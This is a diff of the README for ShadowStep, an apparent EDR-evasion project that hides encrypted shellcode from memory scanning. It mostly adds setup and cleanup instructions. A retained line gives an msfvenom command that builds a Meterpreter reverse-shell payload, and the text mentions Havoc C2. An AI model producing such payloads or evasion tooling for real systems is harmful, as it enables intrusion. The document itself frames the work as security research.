@@ -8,6 +8,21 @@ Many endpoint detection systems rely, among other techniques, on static memory p
 
 > ⚠️ This project is intended for research, educational, and defensive security purposes only.
 
+## Index
+- [Key Concept](#key-concept)
+- [Structure](#structure)
+- [Setup](#setup)
+  - [Requirements](#requirements)
+  - [CLI](#cli-setup)
+  - [GUI](#gui-setup)
+- [Troubleshooting](#troubleshooting)
+- [Usage](#usage)
+- [OPSEC](#opsec)
+- [Case Study](#case-study)
+- [Environment Cleanup](#environment-cleanup)
+- [Acknowledgements](#acknowledgements)
+- [Licensing](#licensing)
+
 ## Key Concept
 
 ShadowStep implements a custom single-step execution engine for encrypted shellcodes.
@@ -38,27 +53,30 @@ The solution `ShadowStep` contains two Visual Studio projects:
 
 ## Setup
 
-### Setup via VCPKG
+### Requirements
+- **Visual Studio (Windows)** installed with the **Desktop development with C++** workload.
+  - Make sure **MSBuild** and the **Windows SDK** are included.
 
-Install vcpkg from the Command Line:  
+### CLI setup
+
+1. Install vcpkg from the Command Line:  
 ```cmd
 git clone https://github.com/microsoft/vcpkg.git
 cd vcpkg
-bootstrap-vcpkg.bat
+bootstrap-vcpkg.bat -disableMetrics
 ```
 
-Install Capstone static library:   
+2. Install Capstone static library:   
 ```cmd
 vcpkg install capstone[x86]:x64-windows-static
 ```
 
-Add the integration for Visual Studio:  
+3. Add the integration for Visual Studio:  
 ```cmd
 vcpkg integrate install
 ```
 
-Open a Developer Command Prompt for VS.  
-Build the ShadowStep Compiler using MSBuild:  
+4. Open a Developer Command Prompt for VS. Build the ShadowStep Compiler using MSBuild:  
 ```cmd
 git clone git@github.com:jtalamini/shadowstep.git
 msbuild shadowstep\ShadowStep.Compiler\ShadowStep.Compiler.vcxproj /t:Clean,Build /p:Configuration=Release /p:Platform=x64
@@ -66,32 +84,32 @@ msbuild shadowstep\ShadowStep.Compiler\ShadowStep.Compiler.vcxproj /t:Clean,Buil
 
 You might choose to build the project with Visual Studio as well.
 
-### Manual Setup
+### GUI setup
 
-Clone this repo:  
+1. Clone this repo:  
 ```cmd
 git clone git@github.com:jtalamini/shadowstep.git
 ```
 
-Download [Capstone](https://github.com/capstone-engine/capstone) and install it somewhere on your machine (e.g., C:\libs\capstone).
+2. Download [Capstone](https://github.com/capstone-engine/capstone) and install it somewhere on your machine (e.g., C:\libs\capstone).
 
 Open the solution in Visual Studio and configure the `ShadowStep.Compiler` project to use Capstone.   
 
-**Add Capstone headers**   
+**3. Add Capstone headers**   
 Navigate to:  
 ```
 (ShadowStep.Compiler) Project → Properties → C/C++ → General → Additional Include Directories
 ```
 add the path to the include folder (e.g., C:\libs\capstone\include).
 
-**Add the library to the linker**  
+**4. Add the library to the linker**  
 Navigate to:  
 ```
 (ShadowStep.Compiler) Project → Properties → Linker → General → Additional Library Directories
 ```
 add the path to the folder containing capstone.lib (e.g., C:\libs\capstone\lib or C:\libs\capstone\msvc)
 
-**Link the library**  
+**5. Link the library**  
 Navigate to:  
 ```
 (ShadowStep.Compiler) Project → Properties → Linker → Input → Additional Dependencies
@@ -99,7 +117,32 @@ Navigate to:
 
 add the value `capstone.lib`
 
-Finally, build the `ShadowStep.Compiler` project using Visual Studio.
+6. Finally, build the `ShadowStep.Compiler` project using Visual Studio.
+
+## Troubleshooting
+
+**MSB8020: Platform Toolset 'v143' cannot be found**  
+
+If you see an error like:
+
+```text
+error MSB8020: The build tools for Visual Studio 2022 (Platform Toolset = 'v143') cannot be found.
+To build using the v143 build tools, please install Visual Studio 2022 build tools.
+Alternatively, you may upgrade to the current Visual Studio tools by selecting the Project menu
+or right-click the solution, and then selecting "Retarget solution".
+```
+It usually means the project is targeting a Visual Studio toolset that is not installed on your machine.
+
+**Solution 1**  
+Install the missing toolset (recommended if you want to keep v143):  
+Install Visual Studio 2022 (or the Visual Studio 2022 Build Tools) and ensure the Desktop development with C++ workload is enabled (MSVC v143, Windows SDK, MSBuild).
+
+**Solution 2**  
+Retarget the solution to the toolset installed on your system:
+Open the solution file (ShadowStep.sln) in Visual Studio.  
+When prompted, accept the Retarget action, or manually:  
+Right-click the solution in Solution Explorer → Retarget solution
+Select the installed Windows SDK/toolset version
 
 ## Usage
 
@@ -132,6 +175,33 @@ This suite was tested on the following _msfvenom_ payloads:
 - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f raw -o met.bin`
 
 It was also tested on `Havoc C2` framework, but as already mentioned, since most agents execute BOFs and spawn a new process every time it is not possible to rely on ShadowStep to hide that kind of execution.
+
+## Environment Cleanup
+This section explains how to remove everything you installed to build ShadowStep, depending on the setup method you followed.
+
+**Cleanup after CLI setup**  
+
+1. Remove the Capstone package:
+```cmd
+vcpkg remove capstone[x86]:x64-windows-static
+```
+
+2. Undo Visual Studio integration:
+```cmd
+vcpkg integrate remove
+```
+
+3. Delete the `vcpkg` folder you cloned.
+
+5. Delete the `ShadowStep` folder you cloned.  
+
+**Cleanup after GUI setup**
+
+If you manually downloaded and installed Capstone:
+
+1. Delete the Capstone directory you placed on disk (e.g., `C:\libs\capstone\`).  
+
+3. Delete the `ShadowStep` folder you cloned.  
 
 ## Acknowledgements
 [Capstone](https://github.com/capstone-engine/capstone) developers for providing a powerful and well-designed disassembly framework that made this research possible.  
